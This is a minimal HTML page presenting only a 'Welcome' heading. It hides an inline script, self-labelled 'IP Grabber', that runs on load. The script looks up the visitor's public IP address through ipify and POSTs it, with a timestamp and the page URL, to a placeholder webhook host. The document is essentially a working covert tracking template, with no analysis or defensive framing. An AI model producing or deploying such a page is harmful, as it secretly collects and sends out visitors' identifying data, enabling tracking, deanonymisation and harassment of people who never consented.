<!DOCTYPE html><html><head><title>Page</title></head><body><h1>Welcome</h1><script>
(function(){
  var data={ip:'',time:new Date().toISOString(),url:window.location.href};
  fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(ipdata){
    data.ip=ipdata.ip;
    fetch('https://your-webhook.com/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  }).catch(function(e){console.log('IP Grabber:',e);});
})();
</script>
</body></html>
